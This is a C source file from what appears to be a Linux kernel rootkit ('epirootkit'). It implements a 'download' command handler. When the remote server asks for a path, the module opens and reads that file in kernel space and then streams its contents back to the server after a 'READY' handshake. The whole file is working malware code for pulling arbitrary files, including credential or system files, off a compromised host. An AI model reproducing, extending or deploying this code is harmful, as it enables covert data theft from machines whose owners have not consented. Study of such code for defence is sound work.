#include "download.h"

#include "epirootkit.h"
#include "io.h"

static bool sending_file = false;
static char *download_buffer = NULL;
static long download_size = 0;

bool is_downloading(void) {
    return sending_file;
}

void reset_download_state(void) {
    if (download_buffer)
        kfree(download_buffer);
    download_buffer = NULL;
    download_size = 0;
    sending_file = false;
}

int download_handler(char *args) {
    if (!args || !*args) {
        send_to_server("Usage: download <path>\n");
        return -EINVAL;
    }

    DBG_MSG("download_handler: reading file %s\n", args);

    struct file *filp = filp_open(args, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        ERR_MSG("download_handler: failed to open %s\n", args);
        send_to_server("Failed to open file.\n");
        return PTR_ERR(filp);
    }

    loff_t pos = 0;
    int size = i_size_read(file_inode(filp));
    if (size <= 0) {
        filp_close(filp, NULL);
        send_to_server("File is empty or unreadable.\n");
        return -EINVAL;
    }

    char *buffer = kmalloc(size, GFP_KERNEL);
    if (!buffer) {
        filp_close(filp, NULL);
        send_to_server("Insufficient memory.\n");
        return -ENOMEM;
    }

    int read_bytes = kernel_read(filp, buffer, size, &pos);
    filp_close(filp, NULL);

    if (read_bytes != size) {
        ERR_MSG("download_handler: failed to read file (%d / %d)\n", read_bytes, size);
        kfree(buffer);
        send_to_server("Error reading file.\n");
        return -EIO;
    }

    download_buffer = buffer;
    download_size = size;
    sending_file = true;

    char size_msg[64];
    snprintf(size_msg, sizeof(size_msg), "SIZE %ld\n", download_size);
    send_to_server(size_msg);

    DBG_MSG("download_handler: ready to send %ld bytes after READY\n", download_size);
    return 0;
}

int download(const char *command) {
    if (sending_file && strncmp(command, "READY", 5) == 0) {
        DBG_MSG("download: sending file (%ld bytes)\n", download_size);
        send_to_server(download_buffer);
        reset_download_state();
        return 0;
    }
    return -1;
}
